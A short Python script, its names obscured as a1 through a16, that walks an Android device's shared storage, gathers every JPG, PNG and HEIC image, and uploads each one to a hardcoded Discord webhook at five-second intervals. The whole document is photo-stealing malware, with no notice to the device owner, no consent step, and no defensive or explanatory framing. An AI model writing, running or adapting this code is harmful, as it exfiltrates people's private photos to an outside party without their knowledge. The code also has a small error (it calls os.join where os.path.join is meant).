import os as a1, requests as a2, time as a3

status=1
a4="/storage/emulated/0"
a5="https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"

def a6(a7):
    try:
        with open(a7,"rb") as a8:
            r=a2.post(a5,files={"file":(a7.split("/")[-1],a8)})
            return r.status_code in (200,204)
    except:
        return False

def a9():
    a10=[]
    for a11,a12,a13 in a1.walk(a4):
        for a14 in a13:
            if a14.lower().endswith((".jpg",".jpeg",".png",".heic")):
                a10.append(a1.join(a11,a14))
    return a10

def run():
    if status!=1:
        return
    a15=a9()
    for a16 in a15:
        a6(a16)
        a3.sleep(5)

if __name__=="__main__":
    run()
